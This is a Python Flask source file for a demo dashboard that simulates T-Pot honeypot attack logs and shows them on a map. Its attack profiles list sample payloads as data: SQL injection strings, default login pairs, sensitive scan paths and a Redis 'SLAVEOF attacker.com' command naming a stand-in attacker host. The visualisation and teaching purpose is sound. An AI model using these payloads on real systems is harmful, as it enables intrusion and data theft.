"""
CyberWatch - Honeypot Attack Visualization Dashboard
Simulates T-Pot honeypot logs for demo/academic purposes
"""

from flask import Flask, render_template, jsonify
from flask_socketio import SocketIO, emit
import random
import time
import threading
import json
from datetime import datetime, timezone
import math

app = Flask(__name__)
app.config['SECRET_KEY'] = 'cyberwatch-secret'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# ─────────────────────────────────────────────
# ATTACK DATA SIMULATION ENGINE
# ─────────────────────────────────────────────

# Real-world IP ranges mapped to countries with geo coords
ATTACKER_SOURCES = [
    {"country": "China",         "cc": "CN", "lat": 35.86, "lon": 104.19, "weight": 18,
     "ip_ranges": ["218.92.", "117.21.", "60.191.", "222.186.", "123.206."]},
    {"country": "Russia",        "cc": "RU", "lat": 61.52, "lon": 105.31, "weight": 14,
     "ip_ranges": ["5.101.", "77.87.", "185.220.", "91.108.", "46.161."]},
    {"country": "United States", "cc": "US", "lat": 37.09, "lon": -95.71, "weight": 10,
     "ip_ranges": ["198.51.", "104.23.", "52.86.", "34.192.", "172.16."]},
    {"country": "Netherlands",   "cc": "NL", "lat": 52.13, "lon": 5.29,   "weight": 8,
     "ip_ranges": ["185.220.", "194.165.", "89.163.", "82.94.", "77.247."]},
    {"country": "Germany",       "cc": "DE", "lat": 51.16, "lon": 10.45,  "weight": 7,
     "ip_ranges": ["85.214.", "78.46.", "188.40.", "5.9.", "46.4."]},
    {"country": "Brazil",        "cc": "BR", "lat": -14.23, "lon": -51.92, "weight": 7,
     "ip_ranges": ["200.147.", "177.54.", "189.50.", "186.202.", "201.59."]},
    {"country": "India",         "cc": "IN", "lat": 20.59, "lon": 78.96,  "weight": 6,
     "ip_ranges": ["117.193.", "103.21.", "49.249.", "122.167.", "59.163."]},
    {"country": "South Korea",   "cc": "KR", "lat": 35.90, "lon": 127.76, "weight": 5,
     "ip_ranges": ["175.211.", "121.53.", "110.35.", "59.18.", "220.75."]},
    {"country": "France",        "cc": "FR", "lat": 46.22, "lon": 2.21,   "weight": 5,
     "ip_ranges": ["5.135.", "178.33.", "51.15.", "91.121.", "37.187."]},
    {"country": "Vietnam",       "cc": "VN", "lat": 14.05, "lon": 108.27, "weight": 4,
     "ip_ranges": ["113.161.", "118.70.", "14.177.", "171.225.", "222.252."]},
    {"country": "Iran",          "cc": "IR", "lat": 32.42, "lon": 53.68,  "weight": 4,
     "ip_ranges": ["5.160.", "2.187.", "185.55.", "94.182.", "37.98."]},
    {"country": "Ukraine",       "cc": "UA", "lat": 48.37, "lon": 31.16,  "weight": 4,
     "ip_ranges": ["188.163.", "91.196.", "77.120.", "195.78.", "109.87."]},
    {"country": "Turkey",        "cc": "TR", "lat": 38.96, "lon": 35.24,  "weight": 3,
     "ip_ranges": ["85.105.", "213.238.", "78.188.", "88.255.", "176.221."]},
    {"country": "Indonesia",     "cc": "ID", "lat": -0.78, "lon": 113.92, "weight": 3,
     "ip_ranges": ["180.252.", "114.79.", "36.66.", "182.1.", "103.12."]},
    {"country": "Taiwan",        "cc": "TW", "lat": 23.69, "lon": 120.96, "weight": 3,
     "ip_ranges": ["61.31.", "114.32.", "218.32.", "1.162.", "36.229."]},
]

# Attack type profiles (port → attack classification)
ATTACK_PROFILES = [
    {"type": "SSH Brute Force",     "port": 22,   "proto": "TCP", "severity": "HIGH",
     "payloads": ["root:root", "admin:admin", "user:123456", "ubuntu:ubuntu"],
     "honeypot": "Cowrie", "color": "#ff4444"},
    {"type": "Telnet Brute Force",  "port": 23,   "proto": "TCP", "severity": "HIGH",
     "payloads": ["admin:admin", "root:vizxv", "guest:12345"],
     "honeypot": "Cowrie", "color": "#ff6644"},
    {"type": "SQL Injection",       "port": 3306, "proto": "TCP", "severity": "CRITICAL",
     "payloads": ["' OR 1=1--", "UNION SELECT NULL--", "'; DROP TABLE users--"],
     "honeypot": "Dionaea", "color": "#ff0066"},
    {"type": "HTTP Directory Scan", "port": 80,   "proto": "TCP", "severity": "MEDIUM",
     "payloads": ["/admin", "/.env", "/wp-login.php", "/phpmyadmin", "/.git/config"],
     "honeypot": "Glastopf", "color": "#ffaa00"},
    {"type": "HTTPS Scan",         "port": 443,  "proto": "TCP", "severity": "MEDIUM",
     "payloads": ["/api/v1/admin", "/actuator/env", "/config.json"],
     "honeypot": "Glastopf", "color": "#ffcc00"},
    {"type": "RDP Brute Force",    "port": 3389, "proto": "TCP", "severity": "CRITICAL",
     "payloads": ["Administrator:Password1", "admin:Welcome1"],
     "honeypot": "RDPY", "color": "#cc00ff"},
    {"type": "SMB Exploit",        "port": 445,  "proto": "TCP", "severity": "CRITICAL",
     "payloads": ["EternalBlue", "MS17-010", "WannaCry"],
     "honeypot": "Dionaea", "color": "#ff0033"},
    {"type": "FTP Brute Force",    "port": 21,   "proto": "TCP", "severity": "MEDIUM",
     "payloads": ["anonymous:", "admin:ftp", "ftp:ftp"],
     "honeypot": "Dionaea", "color": "#ff8800"},
    {"type": "DNS Amplification",  "port": 53,   "proto": "UDP", "severity": "HIGH",
     "payloads": ["ANY isc.org", "TXT ANY", "AAAA amplify"],
     "honeypot": "Honeytrap", "color": "#00ccff"},
    {"type": "SMTP Relay Attempt", "port": 25,   "proto": "TCP", "severity": "MEDIUM",
     "payloads": ["EHLO spam.ru", "MAIL FROM:<bot@evil.com>"],
     "honeypot": "Mailoney", "color": "#00aaff"},
    {"type": "Redis Exploit",      "port": 6379, "proto": "TCP", "severity": "CRITICAL",
     "payloads": ["CONFIG SET dir /tmp", "SLAVEOF attacker.com"],
     "honeypot": "Honeytrap", "color": "#ff3399"},
    {"type": "Memcached Abuse",    "port": 11211,"proto": "UDP", "severity": "HIGH",
     "payloads": ["stats", "get key", "set key 0 0 1"],
     "honeypot": "Honeytrap", "color": "#33ccff"},
    {"type": "VNC Brute Force",    "port": 5900, "proto": "TCP", "severity": "HIGH",
     "payloads": ["password", "12345", "123456"],
     "honeypot": "Honeytrap", "color": "#aa44ff"},
    {"type": "MQTT Intrusion",     "port": 1883, "proto": "TCP", "severity": "MEDIUM",
     "payloads": ["CONNECT", "SUBSCRIBE #", "PUBLISH cmd"],
     "honeypot": "Honeytrap", "color": "#44ffaa"},
]

# Target (honeypot server location — simulated)
TARGET = {"lat": 48.85, "lon": 2.35, "city": "Paris", "country": "France"}

# ─────────────────────────────────────────────
# STATE
# ─────────────────────────────────────────────
attack_log = []
country_stats = {}
attack_type_stats = {}
total_attacks = 0
attacks_per_minute = 0
minute_counter = []
start_time = datetime.now(timezone.utc)

def weighted_choice(items, key='weight'):
    weights = [item[key] for item in items]
    total = sum(weights)
    r = random.uniform(0, total)
    upto = 0
    for item in items:
        upto += item[key]
        if r <= upto:
            return item
    return items[-1]

def generate_ip(source):
    prefix = random.choice(source['ip_ranges'])
    return f"{prefix}{random.randint(1,254)}.{random.randint(1,254)}"

def jitter(val, amount=1.5):
    return val + random.uniform(-amount, amount)

def generate_attack():
    global total_attacks
    source = weighted_choice(ATTACKER_SOURCES)
    profile = random.choice(ATTACK_PROFILES)

    ip = generate_ip(source)
    payload = random.choice(profile['payloads'])
    timestamp = datetime.now(timezone.utc).isoformat()
    total_attacks += 1

    attack = {
        "id": total_attacks,
        "timestamp": timestamp,
        "src_ip": ip,
        "src_country": source['country'],
        "src_cc": source['cc'],
        "src_lat": jitter(source['lat'], 2.5),
        "src_lon": jitter(source['lon'], 2.5),
        "dst_lat": TARGET['lat'],
        "dst_lon": TARGET['lon'],
        "dst_port": profile['port'],
        "protocol": profile['proto'],
        "attack_type": profile['type'],
        "honeypot": profile['honeypot'],
        "payload": payload,
        "severity": profile['severity'],
        "color": profile['color'],
    }

    # Update stats
    c = source['country']
    country_stats[c] = country_stats.get(c, 0) + 1

    t = profile['type']
    attack_type_stats[t] = attack_type_stats.get(t, 0) + 1

    attack_log.insert(0, attack)
    if len(attack_log) > 500:
        attack_log.pop()

    # Track per-minute rate
    now = time.time()
    minute_counter.append(now)
    cutoff = now - 60
    while minute_counter and minute_counter[0] < cutoff:
        minute_counter.pop(0)

    return attack

def get_top_countries(n=10):
    sorted_countries = sorted(country_stats.items(), key=lambda x: x[1], reverse=True)[:n]
    return [{"country": k, "count": v} for k, v in sorted_countries]

def get_top_attack_types(n=8):
    sorted_types = sorted(attack_type_stats.items(), key=lambda x: x[1], reverse=True)[:n]
    return [{"type": k, "count": v} for k, v in sorted_types]

def get_uptime():
    delta = datetime.now(timezone.utc) - start_time
    h = int(delta.total_seconds() // 3600)
    m = int((delta.total_seconds() % 3600) // 60)
    s = int(delta.total_seconds() % 60)
    return f"{h:02d}:{m:02d}:{s:02d}"

# ─────────────────────────────────────────────
# BACKGROUND SIMULATOR THREAD
# ─────────────────────────────────────────────
def simulate_attacks():
    """Mimics realistic T-Pot attack traffic patterns"""
    while True:
        # Simulate burst patterns (real honeypots see waves)
        burst = random.random()
        if burst < 0.02:      # 2%: heavy burst (scanner sweep)
            count = random.randint(3, 6)
            delay = random.uniform(5.0, 8.0)
        elif burst < 0.10:    # 8%: moderate burst
            count = random.randint(2, 3)
            delay = random.uniform(2.0, 4.0)
        else:                 # 90%: normal single attacks
            count = 1
            delay = random.uniform(1.5, 3.0)

        for _ in range(count):
            attack = generate_attack()
            socketio.emit('attack', attack)
            socketio.sleep(0.2) # Short gap between burst attacks

        # Emit stats update every attack
        socketio.emit('stats', {
            "total": total_attacks,
            "per_minute": len(minute_counter),
            "top_countries": get_top_countries(),
            "top_types": get_top_attack_types(),
            "uptime": get_uptime(),
        })

        socketio.sleep(delay)

# ─────────────────────────────────────────────
# ROUTES
# ─────────────────────────────────────────────
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/recent')
def api_recent():
    return jsonify(attack_log[:50])

@app.route('/api/stats')
def api_stats():
    return jsonify({
        "total": total_attacks,
        "per_minute": len(minute_counter),
        "top_countries": get_top_countries(),
        "top_types": get_top_attack_types(),
        "uptime": get_uptime(),
    })

@socketio.on('connect')
def on_connect():
    emit('stats', {
        "total": total_attacks,
        "per_minute": len(minute_counter),
        "top_countries": get_top_countries(),
        "top_types": get_top_attack_types(),
        "uptime": get_uptime(),
    })

# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────
if __name__ == '__main__':
    print("\n  CyberWatch Dashboard starting...")
    print("  Open http://localhost:5000\n")
    socketio.start_background_task(target=simulate_attacks)
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
